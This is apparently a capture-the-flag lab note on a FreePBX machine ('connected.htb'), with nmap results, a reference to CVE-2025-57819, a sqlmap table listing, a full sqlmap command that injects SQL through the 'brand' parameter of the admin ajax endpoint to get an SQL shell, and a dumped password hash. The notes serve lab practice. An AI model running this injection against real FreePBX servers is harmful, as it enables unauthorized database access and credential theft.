#freepbx-sqli 
## Vuxscan

![[Pasted image 20260804222843.png]]

## Nmap

```nmap
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
```

# Using CVE
[[CVE-2025-57819]]

### Checking SQli

```sqlmap
+--------------------------------------+
| admin                                |
| adv_recovery_backuprestore_log       |
| adv_recovery_heartbeat_log           |
| adv_recovery_notifications_log       |
| adv_recovery_primary_server_settings |
| adv_recovery_serviceswitch_log       |
| ampusers                             |
| announcement                         |
| api_access_tokens                    |
| api_applications                     |
| api_asynchronous_transaction_history |
| api_auth_codes                       |
| api_refresh_tokens                   |
| areminder                            |
| areminder_calls                      |
| areminder_settings                   |
| areminder_updates                    |
| arimanager                           |
| broadcast_callees                    |
| broadcast_campaign_groups            |
| broadcast_campaigns                  |
| broadcast_groups                     |
| broadcast_log                        |
| broadcast_settings                   |
| callaccounting_cdr                   |
| callaccounting_decks_trunks          |
| callaccounting_rate_patterns         |
| callaccounting_ratedeck              |
| callback                             |
| callerid_entries                     |
| calllimit                            |
| calllimit_usage                      |
| callrecording                        |
| callrecording_module                 |
| cdrpro_cdr                           |
| cdrpro_email_templates               |
| cdrpro_processed_uniqueids           |
| cdrpro_report_scheduler              |
| cdrpro_score_mes                     |
| cdrpro_unprocessed_uniqueids         |
| certman_cas                          |
| certman_certs                        |
| certman_csrs                         |
| certman_mapping                      |
| chat_push_tokens                     |
| cidlookup                            |
| cidlookup_incoming                   |
| cloud_migration                      |
| conferencespro                       |
| conferencespro_rooms                 |
| contactmanager_entry_emails          |
| contactmanager_entry_images          |
| contactmanager_entry_numbers         |
+--------------------------------------+
```


### SQL Shell


```
sqlmap -u "https://connected.htb/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x" \
  -p brand \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --sql-shell
```

![[Pasted image 20260805105649.png]]


## Got the Passwd Hash

![[Pasted image 20260805110438.png]]

**Text Version**

```passwd_hash
05c689686a4fad5ce3ec76e7ae5708b1fe2da43a
```

